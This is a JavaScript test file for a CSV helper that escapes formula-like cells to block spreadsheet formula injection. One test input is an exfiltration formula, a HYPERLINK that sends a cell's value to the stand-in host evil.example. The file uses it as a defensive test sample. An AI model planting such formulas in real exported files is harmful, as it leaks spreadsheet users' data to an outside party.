import assert from 'node:assert/strict';
import { test } from 'node:test';
import { csvCell, toCsv } from '../src/csv.js';

test('cells a spreadsheet would run as formulas become text', () => {
  assert.equal(csvCell('=1+1'), `"'=1+1"`);
  assert.equal(csvCell('+1'), `"'+1"`);
  assert.equal(csvCell('-1'), `"'-1"`);
  assert.equal(csvCell('@SUM(A1)'), `"'@SUM(A1)"`);
  assert.equal(csvCell('\t=1'), `"'\t=1"`);
  assert.equal(csvCell('\r=1'), `"'\r=1"`);
  assert.equal(
    csvCell('=HYPERLINK("http://evil.example/?x="&A1,"Click")'),
    `"'=HYPERLINK(""http://evil.example/?x=""&A1,""Click"")"`,
  );
});

test('other cells are quoted and otherwise unchanged', () => {
  assert.equal(csvCell('plain'), '"plain"');
  assert.equal(
    csvCell('a "quote", a comma\nand a line'),
    '"a ""quote"", a comma\nand a line"',
  );
  assert.equal(csvCell(' =not first'), '" =not first"');
  assert.equal(csvCell(null), '""');
  assert.equal(csvCell(undefined), '""');
  assert.equal(csvCell(12), '"12"');
});

test('a file is a BOM, a header and CRLF rows', () => {
  const text = toCsv(['id', 'name'], [{ id: 'UAIN-00000001', name: '=x' }]);
  assert.equal(text, '\uFEFF"id","name"\r\n"UAIN-00000001","\'=x"\r\n');
});
